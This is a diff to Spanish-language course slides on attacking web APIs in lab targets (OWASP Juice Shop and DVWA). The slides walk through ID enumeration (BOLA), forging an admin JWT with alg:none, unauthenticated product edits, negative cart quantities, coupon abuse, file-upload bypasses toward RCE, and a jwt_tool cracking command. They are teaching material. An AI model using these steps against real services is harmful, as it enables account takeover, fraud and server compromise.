@@ -1095,16 +1095,20 @@ Vienen de ver **XSS + BeEF** (control de navegadores de víctimas). Ahora cambia
 
 ---
 
-## Agenda
+## Agenda de hoy
 
-- **BOLA** — Broken Object Level Authorization
-- **Mass Assignment** — campos que no deberías poder enviar (API3)
-- **JWT attacks** — manipular tokens de autenticación
-- **API5** — operaciones de admin sin ser admin (`PUT /api/Products`)
-- **API6 / Business Logic** — precio negativo, cupones vencidos en el JS
-- **API Discovery & Sensitive Data** — swagger expuesto + secrets en JS/localStorage
-- **Password Reset débil** — OSINT + preguntas de seguridad
-- **File Upload → RCE** + **Metasploit** — DVWA
+| Bloque | Contenido | Tiempo aprox. |
+|---|---|---|
+| **1** | API1 — BOLA (teoría + demo en Juice Shop) | ~18 min |
+| **2** | API3 — Mass Assignment (teoría + demo + defensa) | ~14 min |
+| **3** | JWT attacks (estructura, alg none, weak secret + demo) | ~16 min |
+| **4** | File Upload → RCE (bypasses + demo en DVWA) | ~14 min |
+| ⏸ | Pausa | ~8 min |
+| **5** | Metasploit para Web (msfvenom + módulos auxiliares) | ~14 min |
+| **6** | API5 — Broken Function Level Auth (demo `PUT /api/Products`) | ~9 min |
+| **7** | API6 — Business Logic (cantidad negativa en el carrito; cupones vencidos como referencia) | ~9 min |
+| **8** | API Discovery & Sensitive Data (Swagger + secrets expuestos) | ~8 min |
+| **9** | Password Reset débil (OSINT + demo) | ~7 min |
 
 **Patrón de la clase:** explicar → detectar → demo en vivo
 
@@ -1164,7 +1168,9 @@ Vienen de ver **XSS + BeEF** (control de navegadores de víctimas). Ahora cambia
 - Solo valida autenticación, no qué puede ver
 - El frontend muestra "tus" recursos, pero la API acepta **cualquier ID**
 
-**Ejemplo:** logueado como usuario 42. La API acepta `GET /api/Users/1` → datos del admin.
+**Ejemplo:** logueado como usuario 2 (jim@juice-sh.op). La API acepta `GET /api/Users/1` → datos del admin (admin@juice-sh.op).
+
+> No todos los IDs existen en el seed de Juice Shop — si uno falla, probar del 1 al 24.
 
 ---
 
@@ -1205,15 +1211,15 @@ SELECT * FROM orders WHERE id = ? AND user_id = currentUser
 POST /rest/user/login
 {"email":"usuario@test.com","password":"test"}
 
-GET /api/Users/42
+GET /api/Users/2
 Authorization: Bearer <token>
 
 GET /api/Users/1
-GET /api/Users/2
 GET /api/Users/3
+GET /api/Users/4
 ```
 
-Burp Intruder: payload numérico 1 a 50 para enumerar usuarios
+Burp Intruder: payload numérico 1 a 24 para enumerar usuarios (no todos los IDs existen en el seed — probar 1 a 24 si uno falla)
 
 ---
 
@@ -1321,7 +1327,9 @@ Signature: HMAC-SHA256(header+payload, secret)
 | --- | --- |
 | Header alg | Cambiar a "none" = sin firma |
 | Payload role | Modificable si no se valida la firma |
-| Secret débil | Crackeable con hashcat en segundos |
+| Secret débil | Crackeable con hashcat en segundos (si el algoritmo es HS256) |
+
+> Nota: Juice Shop v20.2.0 firma con **RS256** (clave asimétrica) — no hay secret HMAC débil que crackear en esta versión. El ataque que sigue funcionando es `alg: none` (demo abajo).
 
 Herramienta: jwt.io — decodea sin necesitar el secret
 
@@ -1330,7 +1338,7 @@ Herramienta: jwt.io — decodea sin necesitar el secret
 ## JWT — ataques comunes
 
 - **Algorithm None:** cambiar alg a none + eliminar la firma
-- **Weak Secret:** si el secret es "secret" o "123456" → crackeable
+- **Weak Secret:** si el secret es "secret" o "123456" → crackeable (⚠️ no aplica a Juice Shop v20.2.0 — firma con RS256, no hay secret HMAC)
 - **RS256 → HS256 confusion:** usar public key como secret HMAC
 - **Expiración ignorada:** reutilizar tokens vencidos
 
@@ -1352,18 +1360,22 @@ python3 jwt_tool.py <token> -C -d rockyou.txt
 1. Login → copiar JWT del header Authorization
 
 2. Decodear en jwt.io:
-   Payload: {"email":"user@test.com","role":"customer"}
+   Header: {"typ":"JWT","alg":"RS256"}
+   Payload: {"data":{"id":2,"email":"jim@juice-sh.op","role":"customer"}}
 
-3. Buscar el secret:
-   DevTools → Sources → Ctrl+F "secret"
-   Juice Shop usa: "secret" como JWT secret
+   Juice Shop v20.2.0 firma con RS256 (clave asimétrica) — el secret
+   "secret" de versiones viejas ya NO existe, no se puede crackear ni re-firmar.
 
-4. En jwt.io:
-   → Cambiar role a "admin"
-   → Pegar el secret
-   → Copiar el nuevo token
+3. Ataque que SÍ funciona: alg:none (ver bullet arriba)
+   Header:  {"typ":"JWT","alg":"none"}
+   Payload: {"data":{"id":1,"role":"admin"}}
+   Firma:   (vacía)
 
-5. Usar en Burp → acceso completo como admin
+   Token armado a mano: base64url(header) + "." + base64url(payload) + "."
+
+4. Usar ese token en Burp contra un endpoint autenticado
+   (ej. GET /api/Users/1) → el servidor responde 200 sin validar la
+   firma: acepta JWT sin firmar si alg dice "none"
 ```
 
 ---
@@ -1413,6 +1425,12 @@ Nivel Medium (valida Content-Type):
 Nivel High (extensión + magic bytes):
 → Renombrar a shell.php5
 → Agregar GIF89a; al inicio del PHP
+
+⚠️ No reproducible en este lab: este bypass depende de que el servidor
+tenga .php5 mapeado como handler PHP — no es el caso acá (Apache valida
+extensión estricta jpg/jpeg/png y, aunque se bypasee con doble extensión
+shell.php.jpg, no hay handler-chain que lo ejecute como PHP). Queda como
+referencia conceptual, no demostrable en vivo en esta instancia.
 ```
 
 Target: https://dvwa.labs.manuel-roldan.cloud
@@ -1527,6 +1545,10 @@ Content-Type: application/json
 
 5. ¿Hay validación de rol? No.
    El servidor solo verifica Bearer token válido.
+
+6. Peor aún: ni siquiera hace falta estar autenticado.
+   Repetir el PUT /api/Products/1 sin header Authorization
+   → también devuelve 200 y modifica el producto.
 ```
 
 **Diferencia con BOLA (API1):** BOLA es acceder a *datos* de otro usuario.
@@ -1558,9 +1580,27 @@ Casos clásicos en Juice Shop:
 
 ---
 
-## Demo — Cupones vencidos (Business Logic)
+## Demo — Cantidad negativa en el carrito (Business Logic)
 
-Los cupones de Juice Shop están **hardcodeados en el JavaScript del frontend**.
+```
+1. POST /api/BasketItems/ {"ProductId":1,"BasketId":<tu_basket_id>,"quantity":1}
+   → agrega producto al carrito
+
+2. PUT /api/BasketItems/<id_del_item> {"quantity":-100}
+   → el backend acepta cantidad negativa sin validar
+
+3. Ver el carrito: el precio total ahora es negativo
+```
+
+**Enseñanza:** la validación de negocio nunca debe vivir solo en el cliente — el backend debe verificar rangos e integridad de forma independiente.
+
+---
+
+## Referencia conceptual — Cupones vencidos (no reproducible en esta versión)
+
+⚠️ **No reproducible en esta versión de Juice Shop** — las apps evolucionan: el cupón `WMNSDY2019` ya no es válido contra la instancia real (devuelve `404 Invalid coupon`, igual que un código inventado). Alternativa confirmada funcionando: cantidad negativa (arriba).
+
+Los cupones de Juice Shop estaban **hardcodeados en el JavaScript del frontend**.
 
 ```
 DevTools → Sources → main.js
@@ -1568,7 +1608,7 @@ Buscar: "coupon" o "WMNSDY" o "ORANGE"
   {code: "WMNSDY2019", discount: 75, validOn: 1551999600000}
 ```
 
-Validación también vive en el cliente:
+Validación también vivía en el cliente:
 
 ```javascript
 if (coupon.validOn < Date.now()) {
@@ -1576,16 +1616,14 @@ if (coupon.validOn < Date.now()) {
 }
 ```
 
-**Aplicarlo igual:**
+**Técnica (conceptual, queda como referencia):**
 ```
 Opción 1 — Burp: POST /rest/basket/1/coupon/WMNSDY2019 → backend no re-valida fecha → aplica 75% off
 Opción 2 — DevTools: cambiar "if (coupon.validOn < Date.now())" por "if (false)"
 Opción 3 — Leer cupones vigentes del JS y aplicarlos directo, sin pasar por la UI
 ```
 
-**También es Business Logic:** el mismo patrón sirve para precio negativo en el carrito (`PUT /api/BasketItems/7 {"quantity":-100}` → total negativo) o para cambiar `BasketId` y ver el carrito de otro usuario (BOLA).
-
-**Enseñanza:** la validación de negocio nunca debe vivir solo en el cliente — el backend debe verificar vigencia e integridad de forma independiente.
+**También es Business Logic:** el mismo patrón sirve para cambiar `BasketId` y ver el carrito de otro usuario (BOLA).
 
 ---
 
@@ -1602,7 +1640,7 @@ Endpoints interesantes:
   GET  /api-docs     ← ¡Swagger/OpenAPI expuesto!
 
 Dónde buscar secrets:
-  DevTools → Sources → JS bundles: contraseñas, API keys, JWT secrets
+  DevTools → Sources → JS bundles: API keys, tokens de terceros (varía por versión)
   DevTools → Application → Local Storage: token JWT (XSS lo roba fácil)
 ```
 
@@ -1616,15 +1654,15 @@ Dónde buscar secrets:
    → Buscar endpoints "admin only" sin protección: DELETE /api/Users/:id, GET /api/Users/
 
 2. DevTools → Sources → main.js (bundle Angular)
-   Ctrl+F: "password" → credenciales hardcodeadas
-   Ctrl+F: "secret"   → JWT secret ("secret")
    Ctrl+F: "token"    → cómo se guarda el auth
+   (en versiones actuales ya no hay passwords/secrets hardcodeados visibles acá)
 
 3. Application → Local Storage → localhost
    → Token JWT completo → copiar y decodear en jwt.io
 
-4. Network → headers de respuesta:
-   X-Powered-By: Express, Server: nginx/1.14 → stack expuesto, CVE buscable
+4. Provocar un error (ej. request malformado a /rest/...) y mirar
+   el <title> de la página de error → revela el framework y versión
+   exacta: "OWASP Juice Shop (Express ^4.22.1)"
 ```
 
 ---
